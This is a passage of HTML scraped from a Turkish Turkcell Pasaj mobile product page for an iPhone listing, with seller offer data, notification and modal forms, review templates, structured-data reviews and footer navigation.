TİC.LTD.ŞTİ.-12319","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"yildirimtelefon@hs03.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"0","insiderPrice":80000.0,"insiderSalePrice":80000.0,"insiderPriceAsStr":"80.000","discountPriceAsStr":"0","insiderSalePriceAsStr":"80.000","discountPrice":0.0},"1286148":{"productModelId":1071334,"psiId":1286148,"colorId":1010388,"price":"24.000","amount":1,"outrightPrice":"24.000","discountName":null,"sellerId":42,"sellerName":"BittiBitiyor","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0744006231400013","cityName":"İstanbul","districtName":"Ataşehir","phoneNumber":null,"address":"Küçükbakkalköy mah. Şerifali cad. Kılıçreis sok. No :4-6 Sar Plaza Ataşehir/İstanbul","tooltipId":3,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"Sar Elektronik","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"sar@hs02.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"74.849","insiderPrice":75199.0,"insiderSalePrice":75199.0,"insiderPriceAsStr":"24.000","discountPriceAsStr":"0","insiderSalePriceAsStr":"24.000","discountPrice":0.0},"1283355":{"productModelId":1071334,"psiId":1283355,"colorId":1010387,"price":"24.000","amount":1,"outrightPrice":"24.000","discountName":null,"sellerId":42,"sellerName":"BittiBitiyor","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0744006231400013","cityName":"İstanbul","districtName":"Ataşehir","phoneNumber":null,"address":"Küçükbakkalköy mah. Şerifali cad. Kılıçreis sok. No :4-6 Sar Plaza Ataşehir/İstanbul","tooltipId":4,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"Sar Elektronik","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"sar@hs02.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"70.099","insiderPrice":75199.0,"insiderSalePrice":75199.0,"insiderPriceAsStr":"24.000","discountPriceAsStr":"0","insiderSalePriceAsStr":"24.000","discountPrice":0.0},"1304937":{"productModelId":1071334,"psiId":1304937,"colorId":1003925,"price":"24.000","amount":2,"outrightPrice":"24.000","discountName":null,"sellerId":42,"sellerName":"BittiBitiyor","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0744006231400013","cityName":"İstanbul","districtName":"Ataşehir","phoneNumber":null,"address":"Küçükbakkalköy mah. Şerifali cad. Kılıçreis sok. No :4-6 Sar Plaza Ataşehir/İstanbul","tooltipId":2,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"Sar Elektronik","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"sar@hs02.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"70.099","insiderPrice":75199.0,"insiderSalePrice":75199.0,"insiderPriceAsStr":"24.000","discountPriceAsStr":"0","insiderSalePriceAsStr":"24.000","discountPrice":0.0},"1291720":{"productModelId":1071334,"psiId":1291720,"colorId":1010387,"price":"85.799","amount":2,"outrightPrice":"85.799","discountName":null,"sellerId":11301,"sellerName":"İntegra Bilgisayar","cargoSla":"2 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0761007672900016","cityName":"İstanbul","districtName":"Ümraniye","phoneNumber":null,"address":"YUKARI DUDULLU MAH. TURNA SOK. NO:27/2  ÜMRANİYE/ İSTANBUL ","tooltipId":9,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"İNTEGRA BİLGİSAYAR SAN.VE TİC.LTD.ŞTİ.-130929","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"info@integrabil.com","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"0","insiderPrice":85799.0,"insiderSalePrice":85799.0,"insiderPriceAsStr":"85.799","discountPriceAsStr":"0","insiderSalePriceAsStr":"85.799","discountPrice":0.0},"1323192":{"productModelId":1071334,"psiId":1323192,"colorId":1003579,"price":"24.000","amount":2,"outrightPrice":"24.000","discountName":null,"sellerId":42,"sellerName":"BittiBitiyor","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0744006231400013","cityName":"İstanbul","districtName":"Ataşehir","phoneNumber":null,"address":"Küçükbakkalköy mah. Şerifali cad. Kılıçreis sok. No :4-6 Sar Plaza Ataşehir/İstanbul","tooltipId":1,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"Sar Elektronik","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"sar@hs02.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"70.099","insiderPrice":75199.0,"insiderSalePrice":75199.0,"insiderPriceAsStr":"24.000","discountPriceAsStr":"0","insiderSalePriceAsStr":"24.000","discountPrice":0.0}}'>
	<input id="google-analytics-device-selected-seller-informations" type="hidden">
	<!-- google-analytics -->
</section>

<div style="display: none" id='errorMsg'>Sepete ekleme işleminde hata oluştu</div>
<div style="display: none" id='errorMsgDigitalCode'>Dijital ürün kodlarıyla birlikte diğer ürünler aynı anda sepete eklenememektedir. Sepetinizdeki ürün için siparişinizi tamamladıktan sonra bu ürünü sepetinize ekleyerek satın alabilirsiniz.</div>
<div style="display: none" id='errorMsgDigitalCodeNonLogin'>Digital ürün alışverişlerinize devam etmek için giriş yapmanız / üye olmanız gerekmektedir.</div>
<div style="display: none" id='errorMsgDonation'>Sepete aynı anda destek ürünü ve normal ürün eklenemez.</div>

<div id="modal-stock" component="ModalStock" class="m-modal m-modal--stock-email" data-component='{"id":"modal-stock","type":"ModalStock","component":"ModalStock","body":{}}'>
	<div class="m-modal__body">
		<form class="m-form" data-url="https://m.turkcell.com.tr/pasaj/addNotifyMe/cep-telefonu/iphone-14-pro-max-512-gb" data-parsley-validate="data-parsley-validate" data-parsley-excluded="disabled, :hidden">
			
			<p>Haberdar Et</p>
			<div class="a-input" data-component='{"type":"Input"}'>
				<input type="email" required name="email" id="s0-0-0-0-39-41-43-input">
				<label for="s0-0-0-0-39-41-43-input">Email Adresi</label>
			</div>
			<label class="a-checkbox" for="stock-checkbox" data-component="FormCheckbox">
				<input type="checkbox" required id="stock-checkbox" name="email_chc">
				<span>Bu bilgilendirmeyi alabilmeniz için izniniz gerekmektedir. “Daha iyi hizmet alabilmem için bilgilerimin Turkcell İletişim Hizmetleri A.Ş, iştirakleri ve bunların iş ortaklarınca, tarafımca aksi belirtiline kadar işlenmesine; Turkcell ve iştiraklerinin iletişim bilgilerimi kullanarak, kampanya, servis, tarife ve hizmetleri ile ilgili duyuruları tarafıma iletmesine izin verdiğimi kabul, beyan ve taahhüt ederim.”</span>
			</label>
			<input type="hidden" name="orderType" id="orderType" value="cash">
			<input type="hidden" name="salesInfoId" id='salesInfoId' value="">
			<button class="a-btn a-btn--full modal-stock-email">Haberdar Et</button>
		</form>
	</div>
	<a class="a-btn-icon btn-close" data-fancybox-close href="javascript:;">
		<i class="icon-close"></i>
		ButtonIcon
	</a>
</div>

<div id="modal-delete" class="m-modal m-modal--regular fancybox-content" style="display:none"   data-component='{"id":"modal-delete","type":"ModalDelete","component":"ModalDelete","body":{}}'>
	<div class="m-modal__body">
		<div class="a-icon-svg a-icon-svg--big">
			<img src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/images/icons/exit.svg?1773534948049" alt=""  />
		</div>
		<p class="modal-delete-message contracted">Sepetinizde kontratlı bir cihaz bulunmaktadır. Bu ürün ile değiştirmek istediğinize emin misiniz?</p>
		<p class="modal-delete-message cash-contracted">Sepetinizde peşine kontratlı bir cihaz bulunmaktadır. Bu ürün ile değiştirmek istediğinize emin misiniz?</p>
		<p class="modal-delete-message shopping-credit">Sepetinizde kredili bir cihaz bulunmaktadır. Bu ürün ile değiştirmek istediğinize emin misiniz?</p>
	</div>
	<div class="m-modal__foot">
		<div class="m-btn-group m-btn-group--spread">
			<a class="a-btn a-btn--secondary" data-fancybox-close="nok" href="javascript:;">Hayır</a>
			<a class="a-btn js-card-delete-btn" data-fancybox-close="ok" href="javascript:;">Evet</a>
		</div>
	</div>
</div>

<div id="modal-not-available-offer" component="ModalWarning" class="m-modal m-modal--warning" data-component='{"id":"modal-warning","type":"ModalWarning","component":"ModalWarning","body":{},"foot":{}}'>
    <div class="m-modal__body">
    	<i class="a-icon icon-circle-warning"></i>
        <p class="modal-message contracted">Hattınız Turkcell Finansman kredili tekliflerimize uygun değildir. Seçtiğiniz ürünü peşin olarak satın alabilirsiniz.</p>
        <p class="modal-message cash-contracted">Hattınız Turkcell peşine kontratlı tekliflerimize uygun değildir. Seçtiğiniz ürünü peşin olarak alabilirsiniz. </p>
    </div>
    <div class="m-modal__foot"><a class="a-btn a-btn--full" data-fancybox-close="ok" href="javascript:;">Tamam</a></div><a class="a-btn-icon btn-close" data-fancybox-close href="javascript:;"><i class="icon-close"></i>ButtonIcon</a></div>
</div>




<script id="offer-card-template" type="text/x-handlebars-template">
	<div class="a-price-radio-b a-price-radio-b--pasaj" data-component="PriceRadioV2" data-color="{{color}}" id="item-{{psiId}}">
		<input type="radio" class="product-basket-type" name="price" id="{{value}}"  data-psi-id="{{value}}" value="{{value}}" data-parsley-multiple="price" data-type="cash">
		<label class="a-price-radio-b__label" for="{{value}}">
			<div class="a-price-radio-b__label__top">
              <span class="a-price-radio-b__title"><span class="m-card-offer__tooltip" data-tooltip-content="#pasaj-{{tooltipId}}" data-component="Tooltip" data-add-active-class=true>{{{title}}} <i class="icon-p icon-p-information"></i></span></span>
				<span class="a-price a-price--gray">{{{price}}}<sup><span class="a-price__currency">TL</span></sup></span>
			</div>
			{{#if point}}
				<div class="a-price-radio-b__left-text">{{{point}}} Puan</div>
			{{/if}}
			{{#if text}}
				<div class="a-price-radio-b__note">{{{text}}}</div>
			{{/if}}
			{{#if discountRate}}
				
			{{/if}}
			{{#if countDown}}
				<div class="a-price-radio-b__label__bottom">
					<div class="a-price-radio-b__label-bottom__column">
						
					</div>
				{{#if stock}}
					<div class="a-price-radio-b__label-bottom__column">
						<span class="a-price-radio-b__label-bottom__stock">{{stock}}</span>
					</div>
				{{/if}}
				</div>
			{{else if countDate}}
				<div class="a-price-radio-b__label__bottom">
					<div class="a-price-radio-b__label-bottom__column">
						
					</div>
				{{#if stock}}
					<div class="a-price-radio-b__label-bottom__column">
						<span class="a-price-radio-b__label-bottom__stock">{{stock}}</span>
					</div>
				{{/if}}
				</div>
			{{/if}}
		</label>
		<div class="tooltip-templates">
			<div id="pasaj-{{tooltipId}}">
				<h3>{{companyName}}</h3>
				<p class="pasaj-addres">
					<span>Mersis No / Vergi No: {{mersisNo}}</span>
					<span>Şehir: {{cityName}}</span>
					<span>Kep Adresi: {{kepAddress}}</span>
					<label>Satıcının Turkcell Pasaj tarafından teyit edilmiş merkez adresi ve onaylanmış iletişim numarası ve e-posta adresi kayıt altında tutulmaktadır.</label>
				</p>
				<a class="a-btn-icon tooltip-close js-tooltip-close" href="javascript:;"><i class="icon-close"></i></a>
			</div>
		</div>
	</div>
</script>





















	<section id="product-detail-info" class="white" data-component='{"lessText":"Daha Az","scrollToTop":true,"type":"MoreContent"}'>
		
			
			
				
					
			
		
	</section>




























	<section id="all-comments" class="product-detail__all-comments white" data-component='{"type": "CommentMoreInfinite", "url": "https://m.turkcell.com.tr/pasaj/comments/cep-telefonu/iphone-14-pro-max-512-gb","refreshable":true }'>
		<div class="container container--narrow">
			
				<h2 class="text-center">Ürün Değerlendirmeleri</h2>
			
			<div class="m-comment-block-view--v2">
				<div class="m-grid">
					<div class="m-grid-col-12">
						<div class="m-comment-block-view--v2__total m-comment-block-view--v2__container">
							
									<div class="m-grid">
										<div class="m-grid-col-3">
											<div class="a-rate m-comment-block-view--v2__rate">
												
		<div class="a-rate">
			<div class="a-rate__star" data-point="5.0">
				
					<span class="icon-star-filled"></span>
				
					<span class="icon-star-filled"></span>
				
					<span class="icon-star-filled"></span>
				
					<span class="icon-star-filled"></span>
				
					<span class="icon-star-filled"></span>
				
			</div>
			
				<div class="a-rate__point">5,0
				</div>
			
		</div>


											</div>
										</div>
										<div class="m-grid-col-4">
											<span class="m-comment-block-view--v2__evaluation">7 kere puanlandı</span>
										</div>
										<div class="m-grid-col-3 m-grid-offset-2">
											<a class="a-btn a-btn--full a-btn--blue" href="https://m.turkcell.com.tr/pasaj/hesabim/degerlendirmelerim">Yorum Yaz</a>
										</div>
										<span class="m-comment-block-view--v2__note"></span>
									</div>
								
						</div>
					</div>
					
						<div class="m-grid-col-5 m-grid-offset-7 m-comment-block-view--v2__select">
							
	<select class="m-select m-select--native" data-component='{"type":"Select"}'  data-placeholder='Sırala' name="select-3" id='' data-parsley-errors-container='#select--error'  >
		
			<option value=""   data-icon="" data-color="" data-title="" title="" ></option>
		
			<option value="ratingDesc"   data-icon="" data-color="" data-title="" title="Puan Çoktan Aza" >Puan Çoktan Aza</option>
		
			<option value="ratingAsc"   data-icon="" data-color="" data-title="" title="Puan Azdan Çoka" >Puan Azdan Çoka</option>
		
			<option value="dateAsc"   data-icon="" data-color="" data-title="" title="Eskiden Yeniye" >Eskiden Yeniye</option>
		
			<option value="dateDesc"   data-icon="" data-color="" data-title="" title="Yeniden Eskiye" >Yeniden Eskiye</option>
		
	</select>
	<div class="m-select-error" id="select--error"></div>

						</div>
					
				</div>
			</div>
			<div class="js-comment-container"></div>
		</div>
		
			<div class="container">
				<div class="m-comment-more">
					<div class="m-comment-more__progress">
						<div class="m-comment-more__progress__bar">
							<span style="width: 30%"></span>
						</div>
						<div class="m-comment-more__progress__info" data-total="7" data-read="3">
							Toplam <span class="js-comment-total">7</span> Yorumun
							<strong>
								<span class="js-comment-read"></span>
								Tanesini
							</strong>
							Okudun
						</div>
					</div>
					<a class="a-btn a-btn--with-icon icon-plus a-btn--with-icon--start a-btn--secondary js-comment-more" href="javascript:;">Daha Fazla</a>
				</div>
			</div>
		
	</section>
	<script id="first-comment-template" type="text/x-handlebars-template">
		<div class="m-comment-block-view--v2__container js-comment-block" id="{{id}}">
			{{#if mostPopular}}
			<span class="m-comment-block-view__most-popular">En Popüler Yorum</span>
			{{/if}}
			<h3 class="m-comment-block-view__title">{{title}}</h3>
			<div class="a-rate m-comment-block-view__rate">
				{{{generalRating}}}
			</div>
			<span class="m-comment-block-view__misc">{{author}} | {{date}}
          {{#if confirmedPurchase}}
          <span class="m-comment-block-view__misc__confirmed">{{confirmedPurchase}}</span>
          {{/if}}
        </span>
			<div class="toggle-content m-comment-block-view__comment" data-component="ToggleContent" data-char-limit="110">
				<p><span class="toggle-content__block">{{{text}}}</span> <a class="toggle-content__button js-toggle-button" href="javascript:;"> Devamını Oku <i class="a-icon icon-arrow-left"></i></a></p>
			</div>
			<div class="m-comment-block-view__helpful">Bu yorumu faydalı buldunuz mu?
				<div class="a-like" data-component="Like" data-service-url="{{likeServiceUrl}}"><a href="javascript:;" class="like">{{like}}</a><a href="javascript:;" class="dislike">{{dislike}}</a></div>
			</div>
		</div>
	</script>

	<script id="comment-template" type="text/x-handlebars-template">
		<div class="m-comment-block-view js-comment-block" id="{{id}}">
			<div class="m-grid">
				<div class="m-grid-col-12">
					<div class="m-comment-block-view__container">
						<div class="a-rate m-comment-block-view__rate">
							{{{generalRating}}}
						</div>
						<span class="m-comment-block-view__misc"> {{author}} | {{date}}
                </span>
						<span class="m-comment-block-view__sales"> {{sales}} <b>{{store}}</b>
                </span>
						{{#if confirmedSales}}
						<span class="m-comment-block-view__confirmed-sales">{{confirmedSales}}</span>
						{{/if}}
					</div>
					<div class="toggle-content m-comment-block-view__comment" data-component="ToggleContent" data-char-limit="310">
						<p><span class="toggle-content__block">{{{text}}}</span> <a class="toggle-content__button js-toggle-button" href="javascript:;">Devamını Oku<i class="a-icon icon-arrow-left"></i></a></p>
						{{#if photo}}
						<div class="m-comment-block-view__photo">
							<div class="m-slider" data-component='{"slidesPerView":"auto","spaceBetween":16, "type":"Slider"}'>
								<div class="m-slider__swiper swiper-container">
									<div class="swiper-wrapper">
										{{#each photo}}
										<div class="swiper-slide">
											<a data-fancybox="{{gruoName}}" href="{{path}}"><img src="{{path}}" alt=""/></a>
										</div>
										{{/each}}
									</div>
									<span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span>
								</div>
							</div>
						</div>
						{{/if}}
						<div class="m-comment-block-view__helpful">Bu yorumu faydalı buldunuz mu?
							<div class="a-like" data-component="Like" data-service-url="{{likeServiceUrl}}"><a href="javascript:;" class="like">{{like}}</a></div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</script>


<div class="container">
	

















</div>

<input type="hidden" id="shopDeviceDetailUtagData"
	data-product-title="iPhone 11 Pro Max 128 GB"
	data-product-category="Cep Telefonu-Aksesuar"
	data-brand="Apple"
	data-product-id="1071334"
	data-stock-state="in_stock"
	data-user-logged="false"
	data-product-sub-category=Apple Telefonlar/>
	
<script>
		var utag_data = utag_data || {};

		utag_data.product_name = ["iPhone 11 Pro Max 128 GB"];
		utag_data.product_category = ["Cep Telefonu-Aksesuar"];
		utag_data.product_brand = ["Apple"];
		utag_data.product_id = ["1071334"];
		utag_data.stock_state = ["in_stock"];
		
</script>


	<script type="application/ld+json">
		{"@context":"http://schema.org/","@type":"Product","name":"iPhone 11 Pro Max 128 GB","url":"https://m.turkcell.com.tr/pasaj/cep-telefonu/ios-telefonlar/iphone-14-pro-max-512-gb","sku":1071334,"brand":{"@type":"Thing","name":"Apple"},"description":"Sihirli bir iPhone deneyimi. Hayat kurtarmak için tasarlanan bir güvenlik özelliği. İnovatif 48 MP Ana kamera. Ve gün ışığında 2 kata kadar daha parlak bir ekran. Hepsi gücünü olağanüstü bir akıllı telefon çipinden alıyor.","aggregateRating":{"@type":"AggregateRating","ratingValue":5.0,"reviewCount":7},"review":[{"@type":"Review","author":"Melisa  Kekeç","description":" ","datePublished":"2023.05.31","reviewRating":{"@type":"Rating","bestRating":5,"ratingValue":5,"worstRating":1}},{"@type":"Review","author":"E.B","description":"Turkcell farkı var tabiki. ","datePublished":"2023.04.16","reviewRating":{"@type":"Rating","bestRating":5,"ratingValue":5,"worstRating":1}},{"@type":"Review","author":"S.A","description":" ","datePublished":"2023.03.21","reviewRating":{"@type":"Rating","bestRating":5,"ratingValue":5,"worstRating":1}},{"@type":"Review","author":"Salih  Sarıhan","description":" ","datePublished":"2023.03.09","reviewRating":{"@type":"Rating","bestRating":5,"ratingValue":5,"worstRating":1}},{"@type":"Review","author":"H.A","description":"Güzel cihaz ama 12 pro max ile bir fark hissedemedim ekran dışında. Sanki halen 12 pro max cihazımı kullanıyorum hissi veriyor.  Ayrıca kutu kenarından hasar almıştı. Ezilmişti. ","datePublished":"2022.11.28","reviewRating":{"@type":"Rating","bestRating":5,"ratingValue":5,"worstRating":1}},{"@type":"Review","author":"Cihat  Bingöl","description":"Sorunsuz bir şekilde geldi hızlı gönderi için Ayrıca teşekkürler","datePublished":"2022.11.26","reviewRating":{"@type":"Rating","bestRating":5,"ratingValue":5,"worstRating":1}},{"@type":"Review","author":"Muhammed Tarkan  Bildek","description":" ","datePublished":"2022.09.28","reviewRating":{"@type":"Rating","bestRating":5,"ratingValue":5,"worstRating":1}}],"image":["https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1663935485571/1-1663935478712.png","https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1663935511411/2-1663935505021.png","https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1663935577405/3-1663935570808.png","https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1663935619191/4-1663935613534.png","https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1663935671281/5-1663935665454.png","https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1663935711564/6-1663935706097.png","https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1663935769375/7-1663935763752.png","https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1663935813383/8-1663935807633.png","https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1662589166505/9-1662589147970.png"],"offers":{"@type":"AggregateOffer","lowPrice":74799.0,"highPrice":85799.0,"priceCurrency":"TRY","availability":"https://schema.org/InStock","offerCount":7,"offers":[{"@type":"Offer","price":77999.0,"priceCurrency":"TRY","offeredBy":{"name":"Turkcell Satış A.Ş.","@type":"Organization"}},{"@type":"Offer","price":80000.0,"priceCurrency":"TRY","offeredBy":{"name":"Yıldırım Telefon - Turkcell Mağazası","@type":"Organization"}},{"@type":"Offer","price":74799.0,"priceCurrency":"TRY","offeredBy":{"name":"Turkcell Pasaj A.Ş.","@type":"Organization"}},{"@type":"Offer","price":85799.0,"priceCurrency":"TRY","offeredBy":{"name":"İntegra Bilgisayar","@type":"Organization"}},{"@type":"Offer","price":75199.0,"priceCurrency":"TRY","offeredBy":{"name":"BittiBitiyor","@type":"Organization"}},{"@type":"Offer","price":78999.0,"priceCurrency":"TRY","offeredBy":{"name":"AKTEL GSM - Turkcell Mağazası","@type":"Organization"}},{"@type":"Offer","price":77998.99,"priceCurrency":"TRY","offeredBy":{"name":"Beşken Elektronik","@type":"Organization"}}]}}
	</script>



	<script type="application/ld+json">
		{"@context":"http://schema.org/","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Pasaj","item":"https://m.turkcell.com.tr/pasaj"},{"@type":"ListItem","position":2,"name":"Cep Telefonu-Aksesuar","item":"https://m.turkcell.com.tr/pasaj/cep-telefonu"},{"@type":"ListItem","position":3,"name":"Apple Telefonlar","item":"https://m.turkcell.com.tr/pasaj/cep-telefonu/ios-telefonlar"},{"@type":"ListItem","position":4,"name":"iPhone 11 Pro Max 128 GB","item":"https://m.turkcell.com.tr/pasaj/cep-telefonu/ios-telefonlar/iphone-14-pro-max-512-gb"}]}
	</script>

	        
			
















	
	
	
	
		
		
		
		
		
		
			








<link rel="stylesheet" href="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/LandingPage/kampanya/apple-iphone-compare-tool/css/style.css">               <!--BEGIN > SCRIPTS:BASE -->      <script type="text/javascript" src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/LandingPage/kampanya/apple-iphone-compare-tool/js/ChannelProductPicker.js"></script>      <!--END > SCRIPTS:BASE -->
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	


			
	    </main>
		















		<footer class="o-p-footer" data-component="PasajMobileNavFooter">
	         <div class="o-p-footer-top">
	
	               
 <div class="m-grid-col">
 	
	                  <nav class="o-p-footer-nav" data-component="PasajMobileNavFooter">
	                      <ul class="o-p-footer-nav__list">
	                        
	                            <li class="dropdown">
	                              <a href="javascript:;" title="Hakkımızda">Hakkımızda</a>
	                              
	                                 <ul>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/iletisim?place=footer&place=footer" title="İletişim">İletişim</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/genel-bakis?place=footer" title="Genel Bakış">Genel Bakış</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/5g?place=footer" title="Turkcell 5G">Turkcell 5G</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/haberler-sosyal-aglar?place=footer" title="Haberler & Duyurular">Haberler & Duyurular</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/kurumsal-iletisim?place=footer" title="Kurumsal İletişim ve Sürdürülebilirlik">Kurumsal İletişim ve Sürdürülebilirlik</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/yatirimci-iliskileri?place=footer" title="Yatırımcı İlişkileri">Yatırımcı İlişkileri</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://kariyerim.turkcell.com.tr?place=footer" title="İnsan Kaynakları">İnsan Kaynakları</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/afettedbirleri?place=footer" title="Afet Tedbirleri">Afet Tedbirleri</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/video-galeri?place=footer" title="Video Galeri">Video Galeri</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/gsyf?place=footer" title="Turkcell GSYF">Turkcell GSYF</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/tr/hakkimizda/toptan?place=footer" title="Toptan">Toptan</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/genel-bakis/istiraklerimiz?place=footer" title="İştiraklerimiz">İştiraklerimiz</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href=" http://turkcell.li/Y42iJ?place=footer" title="Bilgi Toplumu Hizmetleri">Bilgi Toplumu Hizmetleri</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/genel-bakis/turkcell-logo?place=footer" title="Logolarımız">Logolarımız</a>
	                                       </li>
	                                    
	                                 </ul>
	                              
	                           </li>
	                        
	                            <li class="dropdown">
	                              <a href="javascript:;" title="Ürün ve Hizmetler">Ürün ve Hizmetler</a>
	                              
	                                 <ul>
	                                    
	                                       <li>
	                                          <a href="/pasaj?place=footer&place=footer" title="Turkcell Pasaj">Turkcell Pasaj</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://pasajblog.turkcell.com.tr/?place=footer" title="Pasaj Blog">Pasaj Blog</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj-gaming?place=footer" title="Pasaj Gaming">Pasaj Gaming</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/paket-ve-tarifeler?place=footer" title="Paketler">Paketler</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/servisler?place=footer" title="Dijital Servisler">Dijital Servisler</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kampanyalar?place=footer" title="Kampanyalar">Kampanyalar</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/sosyal-destek?place=footer" title="Sosyal Destek">Sosyal Destek</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kulup-ve-programlar?place=footer" title="Kulüp ve Programlar ">Kulüp ve Programlar </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kampanya/hiz-testi/?place=footer&place=footer" title="İnternet Hız Testi">İnternet Hız Testi</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/paket-ve-tarifeler/faturali-hat?place=footer&place=footer" title="Faturalı Paketler">Faturalı Paketler</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/paket-ve-tarifeler/hazir-kart?place=footer" title="Hazır Kart Paketler">Hazır Kart Paketler</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/ev-cozumleri?place=footer&place=footer" title="Ev İnterneti">Ev İnterneti</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kampanya/yazlik-internet/?place=footer" title="Yazlık İnternet">Yazlık İnternet</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/kampanya/eski-telefonunu-sat/?place=footer" title="Telefon Sat">Telefon Sat</a>
	                                       </li>
	                                    
	                                 </ul>
	                              
	                           </li>
	                        
	                            <li class="dropdown">
	                              <a href="javascript:;" title="Popüler Marka ve Kategoriler">Popüler Marka ve Kategoriler</a>
	                              
	                                 <ul>
	                                    
	                                       <li>
	                                          <a href="/apple?place=footer&place=footer" title="Apple Ürünleri ve Aksesuarları ">Apple Ürünleri ve Aksesuarları </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/samsung?place=footer&place=footer" title="Samsung Ürün ve Aksesuarları">Samsung Ürün ve Aksesuarları</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/yenilenmis-telefonlar?place=footer" title="İkinci El / Yenilenmiş Telefonlar">İkinci El / Yenilenmiş Telefonlar</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/kiliflar?place=footer" title="Telefonu Kılıfı">Telefonu Kılıfı</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/elektrikli-ev-aletleri/elektrikli-mutfak-aletleri/kahve-makinesi?place=footer" title="Kahve Makineleri">Kahve Makineleri</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/giyilebilir-teknolojiler/akilli-saatler?place=footer" title="Akıllı Saatler">Akıllı Saatler</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/giyilebilir-teknolojiler/akilli-saatler/apple-watch-series-8-gps-45mm-aluminyum-kasa-spor-kordon?place=footer" title="Apple Watch Series 8 45 mm">Apple Watch Series 8 45 mm</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/giyilebilir-teknolojiler/akilli-saatler/apple-watch-series-7-gps-41-mm?place=footer" title="Apple Watch Series 7 41 mm">Apple Watch Series 7 41 mm</a>
	                                       </li>
	                                    
	                                       <li>
